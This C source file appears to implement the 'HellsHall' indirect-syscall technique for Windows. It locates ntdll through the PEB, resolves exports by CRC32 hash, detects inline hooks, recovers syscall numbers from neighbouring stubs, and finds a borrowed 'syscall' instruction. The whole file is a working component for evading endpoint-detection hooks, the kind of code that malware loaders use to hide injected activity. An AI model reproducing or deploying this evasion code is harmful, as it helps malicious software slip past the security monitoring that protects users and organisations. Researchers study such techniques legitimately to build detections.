#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"


#define SEED        0xEDB88320
#define UP          -32
#define DOWN        32
#define RANGE       0xFF


// structure that will be used to hold information about ntdll.dll
// so that its not computed every time 
typedef struct _NTDLL_CONFIG
{

    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions    [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]    
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                  [IMAGE_EXPORT_DIRECTORY.NumberOfNames]
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs    [BaseAddress]

}NTDLL_CONFIG, * PNTDLL_CONFIG;


NTDLL_CONFIG g_NtdllConf = { 0 };


// Source: https://stackoverflow.com/a/21001712
// the string hashing function - another implementation of the 'Cyclic redundancy check' string hashing algorithm
unsigned int crc32b(char* str) {

    unsigned int    byte, mask, crc = 0xFFFFFFFF;
    int             i = 0, j = 0;

    while (str[i] != 0) {
        byte    = str[i];
        crc     = crc ^ byte;

        for (j = 7; j >= 0; j--) {
            mask    = -1 * (crc & 1);
            crc     = (crc >> 1) ^ (SEED & mask);
        }

        i++;
    }
    return ~crc;
}



// initialize the global 'g_NtdllConf' structure - called only by 'FetchNtSyscall' once
BOOL InitNtdllConfigStructure() {

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the 'g_NtdllConf' structure's element
    g_NtdllConf.uModule = uModule;
    g_NtdllConf.dwNumberOfNames = pImgExpDir->NumberOfNames;
    g_NtdllConf.pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}






BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        //\
        printf("- pcFuncName : %s - 0x%0.8X\n", pcFuncName, HASH(pcFuncName));
        
        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            pNtSys->pSyscallAddress = pFuncAddress;

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSn = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // looking somewhere random
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }
    

    if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL && pNtSys->pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;

}



